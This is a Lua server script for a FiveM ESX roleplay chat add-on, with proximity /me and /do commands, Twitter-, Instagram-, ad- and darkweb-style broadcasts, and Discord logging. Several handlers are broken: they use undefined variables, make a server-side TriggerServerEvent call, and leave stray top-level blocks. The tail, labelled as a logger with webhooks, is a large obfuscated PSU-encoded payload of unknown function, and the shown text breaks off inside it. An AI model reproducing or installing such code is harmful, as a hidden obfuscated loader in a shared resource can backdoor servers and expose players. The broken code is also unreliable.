-- 💻 Chat script made by NS100  Please dont remove creds :)
-- 💻 [Description]: Esx addon chat script to the original fivem chat! - This is not standalone.
-- 💻 [Description 2]: This chat comes with working logs, also made by me.
-- 💻 [Website]: https://NS100.xyz
-- 💻 [Github]: https://github.com/NSFivem/NSFivem/tree/main
-- 💻 [ND Development]: https://discord.gg/yFU4yvacXt
-- 💻 {Disclaimer}: If you use my script please keep my credits! or else you like to copy work! :)

-- ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~= --
--             Optimized & Made By: NS100                 --
-- ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~= --

function getIdentity(source)
	local identifier = GetPlayerIdentifiers(source)[1]
	local result = MySQL.Sync.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {['@identifier'] = identifier})
	if result[1] ~= nil then
		local identity = result[1]

		return {
			identifier = identity['identifier'],
			firstname = identity['firstname'],
			lastname = identity['lastname'],
			dateofbirth = identity['dateofbirth'],
			sex = identity['sex'],
			height = identity['height']
			
		}
	else
		return nil
	end
end

 AddEventHandler('chatMessage', function(source, name, message)
      if string.sub(message, 1, string.len("/")) ~= "/" then
          local name = getIdentity(source)
		TriggerClientEvent("sendProximityMessageMe", -1, source, name.firstname, message)
		 TriggerServerEvent('DiscordBot:ToDiscord', 'chat', GetPlayerName(id) .. ' [ID: ' .. GetPlayerServerId(id) .. ']', data.message, 'steam', GetPlayerServerId(id), false, true)
      end
      CancelEvent()
  end)
  
-- Local Me Proximity
  RegisterCommand('me', function(source, args, user)
	  local name = getIdentity(source)
      TriggerClientEvent("sendProximityMessageMe", -1, source, name.firstname, name.lastname, table.concat(args, " "))
	  TriggerServerEvent('DiscordBot:ToDiscord', 'chat', GetPlayerName(id) .. ' [ID: ' .. GetPlayerServerId(id) .. ']', data.message, 'steam', GetPlayerServerId(id), false, true)
  end)

-- Local Do Proximity
  RegisterCommand('do', function(source, args, user)
	  local name = getIdentity(source)
      TriggerClientEvent("sendProximityMessageDo", -1, source, name.firstname, name.lastname, table.concat(args, " "))
	  TriggerServerEvent('DiscordBot:ToDiscord', 'chat', GetPlayerName(id) .. ' [ID: ' .. GetPlayerServerId(id) .. ']', data.message, 'steam', GetPlayerServerId(id), false, true)
  end)



  RegisterCommand('tweet', function(source, args, rawCommand)
    local src = source
    local send = true
    local steamid = ""
    for _, idents in pairs(GetPlayerIdentifiers(src)) do
        if string.sub(idents, 1, string.len("steam:")) == "steam:" then
            steamid = idents
        end
    end
    local playerName = GetPlayerName(source)
    local id = tonumber(src)
    local msg = rawCommand:sub(4)
    local name = getIdentity(source)
    local steamhex = GetPlayerIdentifier(source)
    local ids = "["..source.."] "
        local id = source;
    fal = ids.. playerName
    fal2 = playerName
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(28, 160, 242, 0.6); border-radius: 3px;"><i class="fab fa-twitter"></i> Twitter: {0}:<br> {1}</div>',
        args = { fal, msg }
    })
    TriggerEvent("nslogs:server:CreateLog", "Someone sent a tweet", "Twitter", "blue", "**Name: **"..playerName.." (ID: "..tonumber(src)..") ("..steamid..")\n**Message:**"..msg, 'Chat')
end, false)



TriggerEvent("es:getPlayers", function(pl)
		for k,v in pairs(pl) do
			TriggerEvent("es:getPlayerFromId", k, function(user)
				if(user.getPermissions() > 0 and k ~= source)then
					TriggerClientEvent('chat:addMessage', k, {
						args = {"^3El del tweet es:", " (^7" .. GetPlayerName(source) .." | "..source.."^0) " .. table.concat(args, " ")}
					})
				end
			end)
		end
	end, false)



RegisterCommand('insta', function(source, args, rawCommand)
    local src = source
    local send = true
    local steamid = ""
    for _, idents in pairs(GetPlayerIdentifiers(src)) do
        if string.sub(idents, 1, string.len("steam:")) == "steam:" then
            steamid = idents
        end
    end
    local playerName = GetPlayerName(source)
    local id = tonumber(src)
    local msg = rawCommand:sub(4)
    local name = getIdentity(source)
    local steamhex = GetPlayerIdentifier(source)
    local ids = "["..source.."] "
        local id = source;
    fal = ids.. playerName
    fal2 = playerName
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(222, 76, 138, 0.6); border-radius: 3px;"><i class="fab fa-instagram"></i> Instagram: {0}:<br> {1}</div>',
        args = { fal, msg }
    })
    TriggerEvent("nslogs:server:CreateLog", "Someone posted on Instagram", "Instagram", "orange", "**Name: **"..playerName.." (ID: "..tonumber(src)..") ("..steamid..")\n**Message:**"..msg, 'Chat')
end, false)

TriggerEvent("es:getPlayers", function(pl)
		for k,v in pairs(pl) do
			TriggerEvent("es:getPlayerFromId", k, function(user)
				if(user.getPermissions() > 0 and k ~= source)then
					TriggerClientEvent('chat:addMessage', k, {
						args = {"^3El de insta es:", " (^7" .. GetPlayerName(source) .." | "..source.."^0) " .. table.concat(args, " ")}
					})
				end
			end)
		end
	end, false)

	
	TriggerEvent("es:getPlayers", function(pl)
		for k,v in pairs(pl) do
			TriggerEvent("es:getPlayerFromId", k, function(user)
				if(user.getPermissions() > 0 and k ~= source)then
					TriggerClientEvent('chat:addMessage', k, {
						args = {"^3EL ANINOMO ES", " (^7" .. GetPlayerName(source) .." | "..source.."^0) " .. table.concat(args, " ")}
					})
				end
			end)
		end
	end, false)


RegisterCommand('ad', function(source, args, rawCommand)
    local src = source
    local send = true
    local steamid = ""
    for _, idents in pairs(GetPlayerIdentifiers(src)) do
        if string.sub(idents, 1, string.len("steam:")) == "steam:" then
            steamid = idents
        end
    end
    local playerName = GetPlayerName(source)
    local msg = rawCommand:sub(4)
    local name = getIdentity(source)
    local ids = "["..source.."] "
    local id = source;
    fal = ids.. playerName
    fal2 = playerName
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(214, 168, 0, 1); border-radius: 3px;"><i class="fab fa-ad"></i> Advertisement: {0}:<br> {1}</div>',
        args = { fal, msg }
    })
    print('[^3AD COMMAND^0] ID',ids,'Just used the command!')
    TriggerEvent("nslogs:server:CreateLog", "Someone posted an Advert", "Advertisement", "yellow", "**Name: **"..playerName.." (ID: "..tonumber(src)..") ("..steamid..")\n**Message:**"..msg, 'Chat')
end, false)
	
	TriggerEvent("es:getPlayers", function(pl)
		for k,v in pairs(pl) do
			TriggerEvent("es:getPlayerFromId", k, function(user)
				if(user.getPermissions() > 0 and k ~= source)then
					TriggerClientEvent('chat:addMessage', k, {
						args = {"^3EL ADMINISTRADOR ES", " (^7" .. GetPlayerName(source) .." | "..source.."^0) " .. table.concat(args, " ")}
					})
				end
			end)
		end
	end, false)

print("NS100#0001 Chat!")



RegisterCommand('darkweb', function(source, args, rawCommand)
    local src = source
    local send = true
    local steamid = ""
    for _, idents in pairs(GetPlayerIdentifiers(src)) do
        if string.sub(idents, 1, string.len("steam:")) == "steam:" then
            steamid = idents
        end
    end
    local playerName = GetPlayerName(source)
    local msg = rawCommand:sub(4)
    local name = getIdentity(source)
    local ids = "["..source.."] "
    local id = source;
    fal = ids.. playerName
    fal2 = playerName
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(25, 21, 0, 0.6); border-radius: 3px;"><i class="fas fa-address-book"></i> DARK WEB:<br> {1}<br></div>',
        args = { fal, msg }
    })
    TriggerEvent("nslogs:server:CreateLog", "Someone posted on the darkweb!", "Darkweb", "grey", "**Name: **"..playerName.." (ID: "..tonumber(src)..") ("..steamid..")\n**Message:**"..msg, 'Chat')
end, false)
	
	TriggerEvent("es:getPlayers", function(pl)
		for k,v in pairs(pl) do
			TriggerEvent("es:getPlayerFromId", k, function(user)
				if(user.getPermissions() > 0 and k ~= source)then
					TriggerClientEvent('chat:addMessage', k, {
						args = {"^3EL DARK WEB ES", " (^7" .. GetPlayerName(source) .." | "..source.."^0) " .. table.concat(args, " ")}
					})
				end
			end)
		end
	end, false)



        RegisterCommand('ooc', function(source, args, rawCommand)
    local src = source
    local send = true
    local steamid = ""
    for _, idents in pairs(GetPlayerIdentifiers(src)) do
        if string.sub(idents, 1, string.len("steam:")) == "steam:" then
            steamid = idents
        end
    end
    local playerName = GetPlayerName(source)
    local id = tonumber(src)
    local msg = rawCommand:sub(5)
    local name = getIdentity(source)
    local ids = "["..source.."] "
    local id = source;

    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(41, 41, 41, 0.6); border-radius: 3px;"><i class="fas fa-globe"></i> ' ..'  ID ['..tonumber(src)..'] - {0}: {1}</div>',
        args = { playerName, msg }
    })
    TriggerEvent("nslogs:server:CreateLog", "Out Of Character", "OOC", "black", "**Name: **"..playerName.." (ID: "..tonumber(src)..") ("..steamid..")\n**Message:**"..msg, 'Chat')
end, false)



function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t={} ; i=1
	for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end


--Logs by NS100

  -- Custom logger -- WEBHOOKS ARE BELOW THIS !!

for n,e in pairs({(function(e,...)local E="This file was obfuscated using PSU Obfuscator 4.0.A | https://www.psu.dev/ & discord.gg/psu";local x=e[((#{767;545;518;827;(function(...)return 747;end)()}+303624967))];local t=e['Uas2kf8J7'];local F=e["L3F0wfb"];local y=e[((#{877;}+677114825))];local r=e[((337780585-#("Luraph v12.6 has been released!: changed absolutely fucking nothing but donate to my patreon!")))];local m=e[(596947923)];local O=e[((#{705;745;468;(function(...)return 890,824,165,...;end)(560,367,653)}+826959607))];local B=e.I0L7FJsY;local S=e[((692955092-#("still waiting for luci to fix the API :|")))];local I=e[((#{116;}+780251603))];local p=e[(522632269)];local J=e[((#{862;48;639;}+444848206))];local Q=e[((754633720-#("https://www.youtube.com/watch?v=Lrj2Hq7xqQ8")))];local c=e[(840867937)];local l=e[((#{692;(function(...)return 233,121,44,471;end)()}+617546842))];local _=e['vux7NSCon'];local d=e[(858336734)];local Y=e[(239715719)];local X=e[((168511844-#("luraph is now down until further notice for an emergency major security update")))];local u=e[((634546682-#("Luraph: Probably considered the worst out of the three, Luraph is another Lua Obfuscator. It isnt remotely as secure as Ironbrew or Synapse Xen, and it isn't as fast as Ironbrew either.")))];local j=e["uYwNyju"];local N=e[((#{265;303;231;920;(function(...)return 657;end)()}+710505052))];local f=e[((919604385-#("Luraph: Probably considered the worst out of the three, Luraph is another Lua Obfuscator. It isnt remotely as secure as Ironbrew or Synapse Xen, and it isn't as fast as Ironbrew either.")))];local T=e['q5iYhJd'];local D=e[(713812115)];local i=e[((817695773-#("Xenvant Likes cock - Perth")))];local b=e[(822020708)];local W=e[((#{944;}+828067076))];local k=e[(448628030)];local M=e[((799276728-#("I hate this codebase so fucking bad! - notnoobmaster")))];local h=e[(857472028)];local q=e[(802411746)];local P=e[(341528333)];local v=((getfenv)or(function(...)return(_ENV);end));local o,s,n=({}),(""),(v(l));local a=((n["\98\105\116\51\50"])or(n[""..e[i]..e[h]..e[r]])or({}));local o=(((a)and(a[""..e[i]..e[I]..e[u]..e[y]]))or(function(e,n)local l,o=l,c;while((e>c)and(n>c))do local r,a=e%t,n%t;if r~=a then o=o+l;end;e,n,l=(e-r)/t,(n-a)/t,l*t;end;if e<n then e=n;end;while e>c do local n=e%t;if n>c then o=o+l;end;e,l=(e-n)/t,l*t;end;return(o);end));local w=(t^F);local g=(w-l);local A,C,L;local U=(s[""..e[b].."\104\97\114"]);local w=(s[""..e[i]..e[D]..e[r].."\101"]);local D=(s["\103\115"..e[f]..e[i]]);local f=(s["\115"..e[f].."\98"]);local D=(n["\116"..e[u].."\110\117\109\98\101\114"]);local Y=((n[""..e[Y].."\97\116"..e[m]][""..e[d]..e[k].."\101"..e[I].."\112"])or(function(e,n,...)return((e*t)^n);end));local k=(n[""..e.sglctwSYt.."\101\108\101\99\116"]);local s=(n[""..e[r].."\121"..e.fbsiTFECLj..e[p]]);local s=(n["\115\101"..e[r].."\109\101\116"..e[x].."\116\97\98\108\101"]);local s=((n["\117"..e[B]..e["fbsiTFECLj"].."\97"..e[b]..e[S]])or(n[""..e[r]..e[x]..e[i]..e[d].."\101"]["\117"..e[B].."\112\97"..e[b].."\107"]));local S=(n["\112"..e[x].."\105\114\115"]);local B=(n["\109\97\116\104"]["\102"..e[d].."\111\111\114"]);local J=(n[""..e[y].."\97"..e[J]..e['sglctwSYt'].."\101"..e[r]]);local J=(a[""..e[i]..e[u].."\114"])or(function(n,e,...)return(g-L(g-n,g-e));end);local g=(a[""..e[i].."\110"..e[u]..e[r]])or(function(e,...)return(g-e);end);L=(a["\98\97\110\100"])or(function(e,n,...)return(((e+n)-o(e,n))/t);end);A=((a["\108\115"..e[m]..e[h].."\102"..e[r]])or(function(n,e,...)if(e<c)then return(C(n,-(e)));end;return((n*t^e)%t^F);end));C=((a[""..e[y]..e.sglctwSYt..e[m].."\105\102"..e[r]])or(function(n,e,...)if(e<c)then return(A(n,-(e)));end;return(B(n%t^F/t^e));end));if((not(n["\98"..e[h]..e[r].."\51"..e['buM6QmhUU']]))and(not(n[""..e[i]..e[h].."\116"])))then a["\98"..e[u].."\114"]=J;a["\98"..e[I].."\111"..e[y]]=o;a[""..e[d]..e["sglctwSYt"].."\104\105\102"..e[r]]=A;a[""..e[i]..e[x].."\110\100"]=L;a["\114\115\104"..e[h].."\102\116"]=C;a[""..e[i].."\110\111\116"]=g;end;local t=(n["\116\97\98\108"..e[p]]["\105\110"..e.sglctwSYt.."\101\114\116"]);local g=(n["\116\97"..e[i]..e[d].."\101"][""..e[b]..e[u].."\110\99"..e[x]..e[r]]);local u=(((n["\116\97"..e[i]..e[d]..e[p]][""..e[b]..e[y]..e[p].."\97"..e[r].."\101"]))or((function(e,...)return({s({},c,e);});end)));local t=(n["\116"..e[x].."\98\108\101"]["\114\101\109\111\118"..e[p]]);n["\98"..e[h].."\116"..e[X]..e['buM6QmhUU']]=a;local n=((-N+(function()local t,o=c,l;(function(e,n,l)e(e(e,l,e),e(n,e,n and l),e(n,l,n))end)(function(e,a,n)if t>M then return e end t=t+l o=(o-O)%P if(o%W)<=Q then return a(n(n,a and n,a),e(n,e,e),e(e,n,n))else return a end return a end,function(n,a,e)if t>q then return n end t=t+l o=(o+T)%_ if(o%j)<=((#{29;}+997))then return n else return a(e(e,e,n),a(n,e,e),n(e,e,e))end return n(e(a,e and n,n),n(e,n,a),a(e,e,n)and a(a,n,e and e))end,function(e,a,n)if t>((#{180;838;635;644;(function(...)return 272,955,416;end)()}+326))then return e end t=t+l o=(o+((#{471;(function(...)return;end)()}+1020)))%((6132-#("When the exploiter is sus")))if(o%(1434))>((#{868;307;805;713;(function(...)return 85,...;end)()}+712))then o=(o-(514))%(38129)return e(n(a,a and e,n)and e(n and e,n,n),a(e and e,a and n,n),a(a,e,a))else return e end return n end)return o;end)()));local t=(#E+(165));local r,x=({}),({});for e=c,t-l do local n=U(e);r[e]=n;x[e]=n;x[n]=e;end;local h,a=(function(o)local e,a,i=w(o,l,((19-#("The Voxel is sus"))));if((e+a+i)~=((#{792;298;555;827;(function(...)return 504,384;end)()}+242)))then n=n+((#{756;67;(function(...)return 11,...;end)(377,774,11,76)}+219));t=t+((111-#("I'm not ignoring you, my DMs are full. Can't DM me? Shoot me a email: mem@mem.rip (Business enquiries only)")));end;o=f(o,(5));local n,a,i=(""),(""),({});local e=l;local function c()local n=D(f(o,e,e),(36));e=e+l;local l=D(f(o,e,e+n-l),((63-#("IIiIIiillIiiIIIiiii :troll:"))));e=e+n;return(l);end;n=x[c()];i[l]=n;while(e<#o)do local e=c();if r[e]then a=r[e];else a=n..f(n,l,l);end;r[t]=n..f(a,l,l);i[#i+l],n,t=a,a,t+l;end;return(g(i));end)("PSU|22L25S10102482471F27622A21j1L1S151a121l1H111y21B1R111726K2431b27622r1H1J1I1R1r1m1n141j1N21i21V1727622X1Q21821p171h1l26A23o2881022X1718171C10121123j1H2762251y1q161M21321j111027o22N23621b27g1826G23R1427623816171g23T2701G27622D21228121N2131U151121321I2821v1A1626E29c27622C21N10132572661927623b1i28E1s1C181E1h2321i1829e1R1s17161r17192202122Aa1022e141129W1429y1623J2AL27622v1228U1h141c1U24F2731J27B21j121e1q28E1n1X2B228421j21f1j1b1Q2321h27t102371m1h16282151B1127I22r1g1A27621Z1y1H29V29x29z1x22C29l1022021p1o1C1F11161D21I21p29421021D1j1625225H28J22P1F1q1t18181423b1V1527622821d2D81721J21S29D1021x2171r1O13233293101a27a2Dg1022t1N101T1t21722c1d2762311c1A1e21M214151r1T1L131E1924N25q28P102212131O1P141e21I2br1n24L2622E9102391r1u121t1R2C41n21721K1I2aP22v2aX2202131V101l1N21C2171724s25d1327b21F1o1N22w1627621v1521G1J2aG27124c2DO22v162AG22R2G02761021s26726725F23q2e027v1b191425225V28U1027c27E27G27I27k21J2132ei2D21222221428J2361N1k141g1m27Q2g82Ea1c27e25b25s28j22c21D2E31j28n22z1c2AX22s2cU1C2f81p152en2ep27622W288141D1J1r1D1n1T161124s25L2C02es29S1121N219181f2c52352hS27622F21i1D1721k1z1L101125L24q28J2b92fB1b1o26325A2bi102J42172171S1Q2C621n2It112Bw2E51d2452682eQ22C1Z1I101b21p2b22B422o132gE2DI2842BW21C22d2GT2j41S112e92jK2F71T1V2fn2CV23G162FU102321B1I21a22d2EQ22B21O1q1r1A21j2jX29Z21O2262e32Kl2kE13181k2212212812831n22023d2Hn1427J2151Z1827324e2Ge22p2dc1F1d1R24j2611e2cE2cg21C1X1M1g161B1A152dk2162282aX28A21821o12121b1d1123I1S2Ge2372aQ2as1921q22B2Cd1022R2MF1618122ct161O21p21U2Ge2361j1F1a1b1221g21u1r27621w1X13171k1P1o21j217191l2132161A28e1821A2Nm1L21d2Bu2bw1722x1p2kk2371a1n25f24o2e02jr2jT1B21621T2e02341J122E92572642c02HM1t1C2cI2B32kZ22i2kk22t1m1322y1j2Ax22p1K112aO2as29426K2412aX2Oa2Ju21321318192392cC2762242lJ21G2ky1621o2Mq27621y27N2852ez1s28l2G12Nm1f1928R1W21Z2kk22v182JV2292aM1021U2191B1T21q21q2qD22y182F322r2Md2Mf21m2191N27e1d122a023P2Ge2322dS1f172Fy2mj2ce2122Ag21821923I2B72f428Z1n1m151l1L21K22k2E02k62191422n24X2QV2762202152N62PE25k24M2c02Cf1h2Nl1115182811B21J22L2DO23b1m181t26v24B1o27622B21M142eU1d1l2Ib1121O21F151D2MJ21R1Z2HW1d192r626F23s2c022421l1k21e21i28U1T2aT1k23A2Iq1023b1O1t2NJ131h2qt22O2qJ27621u2Fq2m42El191w2Ny1Q26124h2EQ2mt1d2Mv2mX171D151V1J26e23m2DW2131y2kJ27622121m21e22j1k2lv102PR171A27m27O2dl2172s11826f23U2AX22a21n1e1F1s21F21H1r1p22n2aw27621t1Y2iA1V2QQ27K23S26F2C027C2Mw2FA2TU2bv1q22j2152gE28l1t281161Q22T2C022B2132ar2At21d21j1d1P1G24n25M2q92Cf27H182C41b26y2Gl29E2Ek2eM23j2t92A321d2oo21i2Qp25625u2CN2ql2mE1D21M21I172Fx2U52U527j23T2vi2TO21c2821A1X21129g2BN1t22U2q92cp2cR2mY1d24Z2632eq28W1B1H1p1921I21c1H2v6142kM2gT22B21e1o21g2141m101i161221j21J2HA2hc27Q2P82px191J2oh1n1h1N26p23Y2F32262171h132TG1p2122181J1p1e2Yo2wi1021t21E102C324826C2Q922U2i72i92SN25f24L2q92mt2nN172tJ1C2152242Q92Pr2Hz2142Y61r24Q25J2e02Hu2R01i26C2yq2g12X0101n2BW21j1y2ag1n1J24j2zY2nd1x2YA1D23k26a2Ul2Zk2PZ121g152C52W62hC26J24B2O32C526y23v2jA2C21H2JD2Jf2JH2jj2JL1T1d24U2652MR22U1F1R2RC1q2eM2lQ24U310G102222111D21721926f2z422E2w52W725K24G2F322821R2xe171w2PM22221p2jt1022b21K1A27j2u41E1J1M21g21O2sL1I192kE23b2WN2Gu21F2Kj1b2FU25725T2ge21V310b18310D22S1E2C02342F82Fa2c52fd2ff2O028J22E312T1N2ei21t24w28I2Ce21H2841v311A22r1m2eQ21Z2R4182eY2T82tA26O2Z428W28y1m28T2T22SV2OI21r2xw2Xy24j2HK276313f2C52EI21S23A2K62762352hb1G1g21M21C1121d2yt192NN313P16235102e02372Tj1M1P23m26j28J2DQ1F2TS111w2cm2pQ2981O2YN2mN1Y217315a2EM1121p2202gT31132k92kb1B2kd2Kf1N2Kh2dy2WO314v1L314X2oq2b424N311N21y2g42aG1X2zQ3161314w2Ib24j25w2kK28L1q235112do22621B2Ag26e23T2Mr2j41Q1B2lb2hD232312R22321A1S21M2182C822o316n27622q2e91321v21031462sW21O312l1O1S2852272c02C228z2R021m2Mc2e926s24d2e022B21n2SX1024U25C1227622n1o22W2172Do22b21I2lg21C2q32762341S1U26P23w27a2TE2EH1t1H317s1F151p1I1D312h1M26f2Rp2MS2bZ2gp1r23n2ZB2B82Ba2ym1t1s1024f26G2do22f21e19181a2Fh2dh317J317l21H21e1s26P2402q921u2jS1m21H2D11624J25U317x21N2p31626K319T2UF2131q1Y311x1g24y31A227622U2u41V1M2712Lm27U2yn2lg1h23j2uK276236171r21d2181m317q1n21M21F1p1K21K22M28J22i21H2mx1B1C1M24F2x72aY21R1r2iC1K1d21l29O2F025V2Do2381t1a1824P2WA2PI2112v11S2T91922q315031ah1a2FU1t24w2d531au2h9141S311h26E2402ja31aV31ax31aZ31B121M21L2zE2Ia2IC26l2a2102Di27e26o31An2Jb2Ba2C51226C2Z42J41J14250314D2C12La2b427124F28j21v2nV102vG2Jp2762371i310D1c172T91L2lq2a0313l1021v2181t1n1Y319q2372Df318G122As2bx312R2Q52Go2me112JZ2mk31b01h31aW26U2462UL27C2m3112bP2T72E42Ta24X25n2AX2qb2qD21R215318P1631af2o92122Hp1524U2Ft2PQ191p23L31BR2Ab1m1j1s216317N27622621N1O2Qz1N2Tu310P26e23X31EN21j2Vl1h1z21f2i831CS112162252ax22B2xW2e31b215319q2192212F322H16312d21H28P2Aq2392E5171Y2K0319m1d317k2yo316t27B2H12jW2cj1625K2ZI2762392RB2CV2nN26e2Ux2va1y1028z1031c21B1N23D2L221Y1Z1131EQ1J1d2jI1i2Ik1n1N21021h31HD1R31hh111H23t319E29m1H2Rl26t2Hf102382sx1l24N2gS31Ah311G315Y318s31BV2CT1H2fb2ei26I31d02202Rl31GT1s26O31i9311f311h2221y2F3311P3124312631H0311P2mr21Z319Q2wZ31h023j2r231Dy21813131t21t22L23c2Y7319128227j317531B02hd31b231CQ31G22sN22z31602z5211101x2TV21O2Rs31bv191N22L2H631Gs31gU1126J31dg319727W2Me1o25025o2UL31FN31FP2R02bq2YE2Mu25K24r2GE22R1c2KA27i24826i2GE2ne29H1r1Q23A31c6312b21N28831L52xh2TO1Z12182Fa31lg21b2872sg21328F2fM1126f318L31KG16312i1q2we2RF2Wk2eN25K2MR2312WX1F1V1u27Y1T24F310M31kG1N31KX2Ju2C52sn1t23a1D2q9311331et191K24W25F2Gf27626O25r22u2Ri2wo2Bd1u1T22y2DO31Di2nn26131h32Er21331dt31Dv1x2222UL21U21c1R2IM21P29o181o21121F311a23l26S27631hn2Gf1C28P2MD31MS1018311J319B2IZ316n152r62qm27T1i21221g27631jG141M25024m2761431oJ2M0318431501531oe24423q276161631oE22B21t276171731OE21H2132762db31OE1D2fL10314v31oE22R314Z2dX1a31Oe23R2452761B316X1m22322h27631nv31OE22Y23c2761d1d31OE1Y21c2761E1E31oe23f22x2761F1f31Oe24923V276314O31OE23Y24c27631IM31Oe24e23W2761I1i31Oe31LW2762Yk31oE152l21K2Ha1M24v2592762RF31oE1F1T2761M1m31oE21331HX31072821M31p72761O1O31OE22722L2761p2EV1M21B2cY101Q1Q31OE31oe27627z31Oe23u2482761s1S31OE21121J2762E531oe22Z23D2761U1U31Oe25224K2761V1v31OE25524R2761w1W31oE192nc31k11X31oE1S2Ul1y1Y31oE23X24f2761z1z31oE23W24e27621021031Oe21g21227621121131Oe25U25c27621221231Oe23a22s2762pC31oE23t24B2762ZU31oE22622K27621521531Oe22s31L71021621631Oe22D21z2762jd31oE21P21b27621821831oe23722P2762192rl1m26025m27621a21A31oE22U23827621b21B31OE25124N27621c21C31oe1z21d27621D21D31OE23e22w27621E21e31Oe24Y24G27621f21F31oE22l22727621g21G141521h21g2mD1328r31HS21531oc1331oE24323L31Oi31Ok24j24X2761531oO1M25w25i31oS31ou1m22I22031Oy31P01M21821Q31P42dc1m21U22827631pa1m21f1x2761a31pF1m23v24931pJ31pl22w23e31Pp1c31OE26325L31PU31Pw1M23c22y31q031q21m22H22331Q631q82812E031qD1M23l24331Qh2bc1M1R2Ax31Qn31oe21X22f31qr31D81M21E1W27631QW31Oe31k231r11L31oE23S24A31r631r81m22122j27631Hu31oe22422M31rG31rI1M24m25031Rm31ro24723P27631rT31Oe24823u31RX1r31OE24T25b31S231s41M24i24w31s81T31Oe21J31K01031SE31RW312A31sK31Oe24123N31Sp31sr1M24a23S2761x31Sw1m22022i27631t031oe24Q25431T531t71m24Z24h31tb31tD1M21T22B31TH31tJ1m25b24T31TN31Tp1M25X25j31tT21331Oe172iY1031tZ1M1V2f331u431oE23J23127631Ua31oE24o25631Uf31891m1O2mR31Ul31oe23h23331Uq31US22J22131uw31uy1M21k21631V231V41m23223g31V831Va29031rb31vf31oe23O24631vK31vm1M22921V31vQ31VS1M23D22Z31vw31vY31W031w212132c91i1l28J31od1M24h24z31WD31OE21v22931Wh31Wj24C23Y31Wn31OE1T318M31oz31Oe24P25731WX31Oe24X24J31X22GP1M22M22431X731x924R25531Xd31oe25624O31XH31OE26725p31XM31oE24d23Z31xR31Oe22522N31xw31oe21W22e31Qc1g31oE21621K31Y431oe21A21o31qm31Qo31b01k31Yd31Oe22G22231Yi31qX1k2GE31r21m24L25331yR31OE25724P31Yw31rd22Q23431Z131oe23b22T31z631Oe25424q31ZA31RU1m23z24d31zF31oE21i21031ZK31oe23023i31zP31Oe22222G31sd31SF1m25824u31sJ31sL1m21D1z320231oe25T31mr31sV31oe2BE320D31t11m312A1031T631OE21c31HC1031tC31oe24W24i320S31OE2ef320x31oE21q218321231Oe26625o31ty21431OE21021I31U331U51m23M240321G31uB1M24b23T321L31Oe23822U31uK31um1M26425Q321u31oE21L217321Y31oe1b1p322331oE2152A51031V931Oe24U25831ve31VG2Sa1q322g31OE22o236322L31oe22t23B322q31vZ31W131W32a61I24N25131W831Oe22f21x32341M25a24S323831Oe25V25d323c1m22c21y31ws31oe22P237323K1m1A2Sf31P9323p23N241323t31OE2tJ323x1m22v23932411M23K24232451M21Z22d32491m23I230324D1m23P247324H31OE31r8324m1m21s22A324q31oE23522R324U1M23323H324Y31OE23123j31YM31OE22e21w32561M31VC325a31oE24223K325E1M22821u325i1M24623o325m31oe22a21s325r1m25Z25h325V1M23G232325Z1M22X23f326331oe25y25g326831oe24523R326d1m23622o320732091W2z710320e1m23Q244320i31oe21921r320N31Oe26525r326y1M22N225327131542c031Tu1M24023M327931oe24F23x327E31OE21421m327J31Oe23431C51031uG1M23922V327s31oe26225K327x2C32Kk31uX31oE25324l32851m21o21a322831oe21721l328E31Oe1J2dw31vL31Oe310Q328m1m24g24Y328q322S31w331p01I24k252328y15322U31w31629t29331Jg31Im2Y826125n32342dg2s1152Pc32eq32es31Hd31Ou23r22t26e31wD1T25m25z31qM31yb31wx210152152DB181L21t22c2c913314V32ex1i25924v329Q31Y62ax31Pk327C31yg31xH32fc21931Nv2hH21221F1I32ER32451531W431Q131qw2IZ1f1e31NV31hu2IZ31w431nV1z316Q31Nt31Pk2Gf1I22K22632412c731x81A2kA31kx2m32DB31Rt1023n22c32f81031Oj21525q26f32f931yc32H41432Fc31tJ31oJ1L25z25e32Fk31Wi32fn112Ja31OT31vz2AQ31OJ32GZ1i1u2eQ31Oj327C21R219329629T32hB31NX1i24s25A31Wd32hx32hZ31on142KJ2dW31Ot2Pe32Hq1432gZ31Nt324h27621H31Bb31Om31Ms31Oj31nS2DW1031Nv31o331o331To32iV31HN31ti32Iv32IK28Q32IO1031sq27623N31CV22s2rE1H25k24V31oM21121Y24h241320r1022W319B14132212IY2242Uo21S2221D1Q1g1C2vU1528u22m2252HW21U2262iY1L2me2s22nz22k1N1e28831w4192u52Ah31W42At2aA31jH32Ke31502MF2cS31W9181131q832jO131F1N21Z1121Z22m1U31c431L8313731e925231m131fm31zQ21E2Uo2I41o23A1l2cN22p28u27F27h2SM2iC21t21X1P2K922z2n627622p31hU2rf1j219216171u25731ff102Is2SB2Za2Q931H52811S1f2ag23I31sU2GF22H1p24732m72281V2ap25z31902Vy1D1c2c824y2672q922X1A31KX21d32m332M525h312a22821h2H9312o1V211324P1431aC2yE2hD26v31Gw102261t22q2931T22p2lJ1K21631mx2MS1c31jG1T24l316i2Wj1631d52e031Bt1T1O191x31g627621S2112yK31081M2Jk2a131bs1H2HD24j32mZ32Lc1G31Jf31jH31G42kQ2G1218111q2Bz1Q22h23D2192NN1X2n227622T2iM1731eq31ke28J31Kw32Oy32p021q22t2vR31aH2AA2fA1N24w2iF2762hU2M02xx2Ev2SN26l31DX21v2162E51j1V1b23M26M31OM2331S24K32M722Y32Lt1121J31B832Pr112ng2NI1o22j318929e1h2oO21O31wR32j132it28P1i32aF32hb21021131Oo31OJ31t61024k24J28J31oj2162Y332iQ2y832qx32HW32R031oj1432r323O23X2aX31oj2n727P28J32qW2DO32hW1532HE2lG315v29332EV31R732IV31ot28F142BB31ot2nj112y9324t1031OZ32QZ29G31oz1z1X1232ef312A31oz32r931fP318m32s831Ws32sC31oZ1732SF1223o24032s931o